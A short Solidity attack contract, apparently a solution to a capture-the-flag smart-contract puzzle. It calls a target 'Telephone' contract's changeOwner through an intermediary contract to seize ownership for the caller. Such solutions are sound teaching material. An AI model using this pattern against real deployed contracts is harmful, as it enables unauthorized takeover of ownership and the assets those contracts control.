// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './telephone.sol';

contract telephoneAttack{

  Telephone public TelephoneContract;

  constructor(address _telephoneContractAddress) {
    TelephoneContract = Telephone(_telephoneContractAddress);
  }

  function exploit() public {
    TelephoneContract.changeOwner(msg.sender);
  }
}